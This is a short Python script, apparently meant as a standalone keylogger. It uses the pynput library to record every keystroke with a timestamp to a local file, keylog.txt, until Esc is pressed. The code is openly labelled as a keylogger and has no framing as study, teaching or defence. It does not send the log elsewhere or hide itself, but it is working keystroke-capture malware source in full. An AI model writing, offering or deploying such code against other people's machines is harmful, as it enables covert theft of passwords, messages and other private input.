from pynput import keyboard
import datetime

# File to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            # For regular characters
            f.write(f'{timestamp} - Key pressed: {key.char}\n')
        except AttributeError:
            # For special keys
            f.write(f'{timestamp} - Special key pressed: {key}\n')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when 'esc' key is pressed
        return False

# Create and start the listener
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

print(f"Keylogger started. Logging to {log_file}. Press 'esc' to stop.")
listener.join()

print(f"Keylogger stopped. Keystrokes have been logged to {log_file}.")